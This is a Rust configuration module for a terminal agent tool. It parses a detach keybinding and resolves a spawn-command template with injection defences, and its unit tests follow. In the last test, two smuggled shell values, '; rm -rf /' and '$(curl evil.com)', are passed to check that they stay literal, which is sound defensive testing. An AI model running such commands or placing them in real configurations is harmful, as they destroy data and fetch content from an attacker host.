//! User config loaded from `$XDG_CONFIG_HOME/picoswarm/config.toml`.
//!
//! Optional file. When the file is absent we use compiled-in defaults.
//! When the file is present, parse failures bubble up — silent
//! fallback would hide typos that the user expects to take effect.

use anyhow::{Context, Result, anyhow};
use serde::Deserialize;

use crate::paths;

#[derive(Debug, Default, Deserialize)]
#[serde(default, deny_unknown_fields)]
pub struct Config {
    pub keybind: KeyBind,
    pub spawn: Option<Spawn>,
}

/// Optional `[spawn]` section. When present, `pswarm run --spawn <name>`
/// fires `command` after the agent has been registered, with `{name}`
/// substituted. The argv array is exec'd directly via
/// `Command::new(argv[0]).args(...)` — **no shell** — so shell
/// metacharacters (`;`, `|`, `$()`, etc.) carry no meaning.
#[derive(Debug, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct Spawn {
    pub command: Vec<String>,
}

#[derive(Debug, Deserialize)]
#[serde(default, deny_unknown_fields)]
pub struct KeyBind {
    /// Detach key spec, parsed by [`parse_detach_key`]. Default
    /// `ctrl+\` matches the original hardcoded behaviour.
    pub detach: String,
}

impl Default for KeyBind {
    fn default() -> Self {
        Self {
            detach: "ctrl+\\".into(),
        }
    }
}

pub fn load() -> Result<Config> {
    let path = paths::config_path()?;
    if !path.exists() {
        return Ok(Config::default());
    }
    let text = std::fs::read_to_string(&path)
        .with_context(|| format!("reading config file {}", path.display()))?;
    toml::from_str::<Config>(&text)
        .with_context(|| format!("parsing config file {}", path.display()))
}

/// One key encoded in two forms: the raw C0 byte (when one exists) and
/// the CSI-u sequence reported under kitty keyboard protocol level 1.
/// Both are matched against incoming stdin so the trigger fires
/// regardless of whether the agent has enabled CSI-u reporting.
#[derive(Debug, Clone)]
pub struct DetachTrigger {
    pub raw_byte: Option<u8>,
    pub csi_u: Vec<u8>,
}

/// Parse `ctrl+<char>` into a [`DetachTrigger`].
///
/// MVP scope: exactly one modifier (`ctrl`) plus a single ASCII
/// printable character. Other combinations are rejected with a clear
/// error so the user notices their config has not taken effect.
pub fn parse_detach_key(spec: &str) -> Result<DetachTrigger> {
    let trimmed = spec.trim();
    if trimmed.is_empty() {
        return Err(anyhow!("detach key is empty"));
    }
    let parts: Vec<&str> = trimmed.split('+').map(str::trim).collect();
    if parts.len() < 2 {
        return Err(anyhow!(
            "detach key '{spec}' must be modifier+key (e.g. 'ctrl+\\\\')"
        ));
    }
    let Some((key_part, modifiers)) = parts.split_last() else {
        return Err(anyhow!("detach key '{spec}' has no key"));
    };

    let mut ctrl = false;
    let mut shift = false;
    let mut alt = false;
    let mut sup = false;
    for m in modifiers {
        match m.to_ascii_lowercase().as_str() {
            "ctrl" | "control" => ctrl = true,
            "shift" => shift = true,
            "alt" | "meta" | "option" => alt = true,
            "super" | "cmd" | "win" => sup = true,
            other => {
                return Err(anyhow!("unknown modifier '{other}' in detach key '{spec}'"));
            }
        }
    }
    if !ctrl || shift || alt || sup {
        return Err(anyhow!(
            "for now only 'ctrl+<key>' detach combos are supported (got '{spec}')"
        ));
    }

    let key_chars: Vec<char> = key_part.chars().collect();
    if key_chars.len() != 1 {
        return Err(anyhow!(
            "detach key '{key_part}' must be a single ASCII character (named keys are not yet supported)"
        ));
    }
    let key = key_chars[0];
    if !key.is_ascii() {
        return Err(anyhow!("detach key '{key}' must be ASCII"));
    }

    let raw_byte = ctrl_raw_byte(key);
    let codepoint = u32::from(key);
    let csi_u = format!("\x1b[{codepoint};5u").into_bytes();

    Ok(DetachTrigger { raw_byte, csi_u })
}

/// Resolve a spawn template into a concrete argv with `{name}`
/// substituted. Enforces the defenses we documented:
///
/// - **L1 (no shell)**: this function returns an argv; the caller
///   is expected to use `Command::new(argv[0]).args(&argv[1..])`,
///   never `sh -c`.
/// - **L2 (1→1 element substitution)**: substitution happens per
///   argv element. The substituted value never re-tokenizes; one
///   element in → one element out, regardless of the value's content.
/// - **L3 (allowlisted placeholders)**: only `{name}` is recognized.
///   Unknown placeholders error at resolve time so a typo does not
///   silently expand to empty.
/// - **L4 (variable-value validation)**: NUL bytes and newlines in
///   `name` are rejected even though the agent-name validator should
///   already have caught them — defense in depth.
///
/// L5 (argv[0] allowlist) is intentionally **not** enforced here:
/// honest survey of OS facilities and similar tools (direnv, mise,
/// VSCode workspace trust, cargo) confirmed no genuine local defense
/// exists against a same-UID attacker rewriting the config, and a
/// terminal-binary allowlist creates friction for users running
/// custom or self-built terminals without buying real safety. We
/// rely instead on the caller's α (transparent argv printout) so the
/// user can spot anomalies.
pub fn resolve_spawn_argv(template: &[String], name: &str) -> Result<Vec<String>> {
    if name.contains('\0') || name.contains('\n') {
        return Err(anyhow!(
            "agent name contains NUL or newline; refusing to substitute into spawn template"
        ));
    }
    let argv: Vec<String> = template
        .iter()
        .map(|element| substitute_element(element, name))
        .collect::<Result<Vec<_>>>()?;
    if argv.is_empty() {
        return Err(anyhow!("spawn template is empty"));
    }
    if argv[0].is_empty() {
        return Err(anyhow!("spawn template argv[0] is empty"));
    }
    Ok(argv)
}

fn substitute_element(element: &str, name: &str) -> Result<String> {
    let mut out = String::with_capacity(element.len());
    let mut chars = element.chars();
    while let Some(c) = chars.next() {
        if c != '{' {
            out.push(c);
            continue;
        }
        let mut placeholder = String::new();
        let mut closed = false;
        for next in chars.by_ref() {
            if next == '}' {
                closed = true;
                break;
            }
            placeholder.push(next);
        }
        if !closed {
            return Err(anyhow!(
                "unclosed `{{` placeholder in spawn template element: {element:?}"
            ));
        }
        match placeholder.as_str() {
            "name" => out.push_str(name),
            other => {
                return Err(anyhow!(
                    "unknown placeholder `{{{other}}}` in spawn template; supported: `{{name}}`"
                ));
            }
        }
    }
    Ok(out)
}

/// Render an argv as a single line for human-readable logging. Quotes
/// elements containing whitespace; never re-interpretable as a shell
/// command (this is for the user's eyes only — the actual exec uses
/// the argv directly).
pub fn display_argv(argv: &[String]) -> String {
    argv.iter()
        .map(|a| {
            if a.is_empty() || a.chars().any(char::is_whitespace) {
                format!("{a:?}")
            } else {
                a.clone()
            }
        })
        .collect::<Vec<_>>()
        .join(" ")
}

/// Return the C0 byte the terminal sends for `Ctrl+<key>` in the
/// classic ASCII control mapping, or `None` if no canonical mapping
/// exists (in which case only the CSI-u form will match).
const fn ctrl_raw_byte(key: char) -> Option<u8> {
    match key {
        'a'..='z' => Some(key as u8 - b'a' + 1),
        'A'..='Z' => Some(key as u8 - b'A' + 1),
        '@' => Some(0x00),
        '[' => Some(0x1b),
        '\\' => Some(0x1c),
        ']' => Some(0x1d),
        '^' => Some(0x1e),
        '_' => Some(0x1f),
        '?' => Some(0x7f),
        _ => None,
    }
}

#[cfg(test)]
#[allow(clippy::unwrap_used)]
mod tests {
    use super::*;

    #[test]
    fn default_detach_is_ctrl_backslash() {
        let cfg = Config::default();
        let t = parse_detach_key(&cfg.keybind.detach).unwrap();
        assert_eq!(t.raw_byte, Some(0x1c));
        assert_eq!(t.csi_u, b"\x1b[92;5u");
    }

    #[test]
    fn parses_ctrl_letter() {
        let t = parse_detach_key("ctrl+a").unwrap();
        assert_eq!(t.raw_byte, Some(0x01));
        assert_eq!(t.csi_u, b"\x1b[97;5u");
    }

    #[test]
    fn case_insensitive_modifier() {
        let t = parse_detach_key("Ctrl+B").unwrap();
        assert_eq!(t.raw_byte, Some(0x02));
    }

    #[test]
    fn rejects_unknown_modifier() {
        assert!(parse_detach_key("hyper+x").is_err());
    }

    #[test]
    fn rejects_no_modifier() {
        assert!(parse_detach_key("a").is_err());
    }

    #[test]
    fn rejects_extra_modifiers() {
        assert!(parse_detach_key("ctrl+shift+a").is_err());
    }

    #[test]
    fn rejects_non_ctrl_modifier() {
        assert!(parse_detach_key("alt+a").is_err());
    }

    #[test]
    fn rejects_named_key() {
        assert!(parse_detach_key("ctrl+space").is_err());
    }

    #[test]
    fn parses_from_toml_string() {
        let cfg: Config = toml::from_str(
            r#"[keybind]
detach = "ctrl+b"
"#,
        )
        .unwrap();
        assert_eq!(cfg.keybind.detach, "ctrl+b");
    }

    #[test]
    fn parses_from_toml_literal_string() {
        // Literal string ('...') passes the backslash through unescaped.
        let cfg: Config = toml::from_str(
            r"[keybind]
detach = 'ctrl+\'
",
        )
        .unwrap();
        assert_eq!(cfg.keybind.detach, "ctrl+\\");
    }

    #[test]
    fn rejects_unknown_top_level_keys() {
        let res: Result<Config, _> = toml::from_str(r#"foo = "bar""#);
        assert!(res.is_err());
    }

    // ---- spawn template / resolve_spawn_argv ----

    #[test]
    fn substitutes_name_placeholder() {
        let argv = resolve_spawn_argv(
            &[
                "kitty".into(),
                "@".into(),
                "launch".into(),
                "--type=tab".into(),
                "--tab-title".into(),
                "{name}".into(),
                "pswarm".into(),
                "attach".into(),
                "{name}".into(),
            ],
            "feat-x",
        )
        .unwrap();
        assert_eq!(argv[5], "feat-x");
        assert_eq!(argv[8], "feat-x");
        assert_eq!(argv.len(), 9);
    }

    #[test]
    fn substitution_is_per_element() {
        // L2: the substituted value never re-tokenizes. Even though
        // `name` here contains spaces (impossible in practice — the
        // validator forbids them — but we test the property), the
        // single argv element stays a single element.
        let argv = resolve_spawn_argv(&["{name}".into()], "weird name").unwrap();
        assert_eq!(argv, vec!["weird name"]);
    }

    #[test]
    fn rejects_unknown_placeholder() {
        let err = resolve_spawn_argv(&["{cwd}".into()], "x").unwrap_err();
        assert!(err.to_string().contains("unknown placeholder"));
    }

    #[test]
    fn rejects_unclosed_brace() {
        let err = resolve_spawn_argv(&["{name".into()], "x").unwrap_err();
        assert!(err.to_string().contains("unclosed"));
    }

    #[test]
    fn rejects_nul_in_name() {
        let err = resolve_spawn_argv(&["{name}".into()], "a\0b").unwrap_err();
        assert!(err.to_string().contains("NUL or newline"));
    }

    #[test]
    fn rejects_newline_in_name() {
        let err = resolve_spawn_argv(&["{name}".into()], "a\nb").unwrap_err();
        assert!(err.to_string().contains("NUL or newline"));
    }

    #[test]
    fn rejects_empty_template() {
        let err = resolve_spawn_argv(&[], "x").unwrap_err();
        assert!(err.to_string().contains("empty"));
    }

    #[test]
    fn rejects_empty_argv0() {
        let err = resolve_spawn_argv(&[String::new()], "x").unwrap_err();
        assert!(err.to_string().contains("argv[0] is empty"));
    }

    #[test]
    fn parses_spawn_section_from_toml() {
        let cfg: Config = toml::from_str(
            r#"[spawn]
command = ["kitty", "@", "launch", "pswarm", "attach", "{name}"]
"#,
        )
        .unwrap();
        let spawn = cfg.spawn.unwrap();
        assert_eq!(spawn.command.len(), 6);
        assert_eq!(spawn.command[0], "kitty");
        assert_eq!(spawn.command[5], "{name}");
    }

    #[test]
    fn spawn_section_is_optional() {
        let cfg: Config = toml::from_str("").unwrap();
        assert!(cfg.spawn.is_none());
    }

    #[test]
    fn spawn_rejects_unknown_field() {
        let res: Result<Config, _> = toml::from_str(
            r#"[spawn]
command = ["kitty"]
allow_arbitrary = true
"#,
        );
        assert!(res.is_err(), "unknown field in [spawn] should be rejected");
    }

    #[test]
    fn display_argv_quotes_whitespace() {
        let s = display_argv(&["kitty".into(), "--title".into(), "My Tab".into()]);
        assert_eq!(s, "kitty --title \"My Tab\"");
    }

    #[test]
    fn display_argv_leaves_simple_args_unquoted() {
        let s = display_argv(&["kitty".into(), "@".into(), "launch".into()]);
        assert_eq!(s, "kitty @ launch");
    }

    #[test]
    fn shell_metacharacters_pass_through_as_literal_argv() {
        // Sanity: even if a malicious template put shell metacharacters
        // in argv elements, the resolver does NOT interpret them — they
        // become literal characters in argv. Defense L1 (no shell) is
        // enforced at exec time by the caller (Command::new + args),
        // but we confirm nothing in this resolver corrupts them.
        let argv = resolve_spawn_argv(
            &[
                "kitty".into(),
                "; rm -rf /".into(),
                "{name}".into(),
                "$(curl evil.com)".into(),
            ],
            "x",
        )
        .unwrap();
        assert_eq!(argv[1], "; rm -rf /");
        assert_eq!(argv[3], "$(curl evil.com)");
    }
}
